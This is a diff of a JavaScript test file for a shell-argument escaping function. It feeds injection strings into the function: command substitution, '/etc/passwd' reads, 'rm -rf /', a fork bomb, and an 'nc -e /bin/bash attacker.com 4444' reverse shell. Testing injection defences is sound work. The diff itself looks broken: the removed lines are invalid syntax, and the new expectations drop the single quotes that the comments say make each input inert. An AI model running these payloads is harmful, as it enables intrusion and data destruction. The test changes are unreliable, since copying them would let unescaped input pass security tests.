@@ -276,7 +276,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackUserId = '$(whoami)';
       const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
       
-      expect(safePath).toBe(''/workspace/users/$(whoami)'');
+      expect(safePath).toBe('/workspace/users/$(whoami)');
       // $ is inside single quotes, won't expand
     });
 
@@ -284,7 +284,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackConvId = '`cat /etc/passwd`';
       const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
       
-      expect(safePath).toBe(''/workspace/sessions/`cat /etc/passwd`'');
+      expect(safePath).toBe('/workspace/sessions/`cat /etc/passwd`');
       // Backticks inside single quotes, won't execute
     });
 
@@ -292,7 +292,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackUserId = 'user|cat /etc/passwd';
       const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
       
-      expect(safePath).toBe(''/workspace/users/user|cat /etc/passwd'');
+      expect(safePath).toBe('/workspace/users/user|cat /etc/passwd');
       // Pipe inside quotes is literal
     });
 
@@ -300,7 +300,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackConvId = 'session&rm -rf /';
       const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
       
-      expect(safePath).toBe(''/workspace/sessions/session&rm -rf /'');
+      expect(safePath).toBe('/workspace/sessions/session&rm -rf /');
       // Ampersand inside quotes is literal
     });
 
@@ -308,7 +308,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackUserId = 'user; nc -e /bin/bash attacker.com 4444';
       const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
       
-      expect(safePath).toBe(''/workspace/users/user; nc -e /bin/bash attacker.com 4444'');
+      expect(safePath).toBe('/workspace/users/user; nc -e /bin/bash attacker.com 4444');
       // Entire string is quoted, no command execution
     });
 
@@ -316,7 +316,7 @@ describe('Shell Command Injection Prevention', () => {
       const attackConvId = ':(){ :|:& };:';
       const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
       
-      expect(safePath).toBe(''/workspace/sessions/:(){ :|:& };:'');
+      expect(safePath).toBe('/workspace/sessions/:(){ :|:& };:');
       // Fork bomb syntax inside quotes is inert
     });
   });
@@ -344,14 +344,14 @@ describe('Shell Command Injection Prevention', () => {
       const userId = '用户';
       const escaped = escapeShellArg(userId, false);
       
-      expect(escaped).toBe(''用户'');
+      expect(escaped).toBe('用户');
     });
 
     it('should handle newlines', () => {
       const malicious = 'user\nrm -rf /';
       const escaped = escapeShellArg(malicious, false);
       
-      expect(escaped).toBe(''user\nrm -rf /'');
+      expect(escaped).toBe('user\nrm -rf /');
       // Newline inside quotes is literal
     });
 
@@ -359,7 +359,7 @@ describe('Shell Command Injection Prevention', () => {
       const malicious = 'user\trm -rf /';
       const escaped = escapeShellArg(malicious, false);
       
-      expect(escaped).toBe(''user\trm -rf /'');
+      expect(escaped).toBe('user\trm -rf /');
     });
 
     it('should handle very long strings', () => {
